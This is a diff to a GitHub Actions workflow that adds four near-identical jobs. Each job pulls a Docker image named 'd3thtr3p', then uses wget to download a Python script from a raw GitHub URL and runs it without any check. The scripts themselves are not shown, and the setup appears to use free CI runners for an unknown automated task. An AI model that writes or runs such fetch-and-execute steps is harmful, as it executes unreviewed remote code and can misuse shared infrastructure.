@@ -18,3 +18,39 @@ jobs:
     - name: Run Docker file
       run: |
            docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Rdxcj/67/main/yt.py && python3 yt.py"
+  YT2:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:v1
+    - name: Run Docker file
+      run: |
+           docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Rdxcj/67/main/yt2.py && python3 yt2.py"
+  YT3:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:v1
+    - name: Run Docker file
+      run: |
+           docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Rdxcj/67/main/yt3.py && python3 yt3.py"
+  YT4:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:v1
+    - name: Run Docker file
+      run: |
+           docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Rdxcj/67/main/yt4.py && python3 yt4.py"
+  YT5:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:v1
+    - name: Run Docker file
+      run: |
+           docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Rdxcj/67/main/yt5.py && python3 yt5.py"
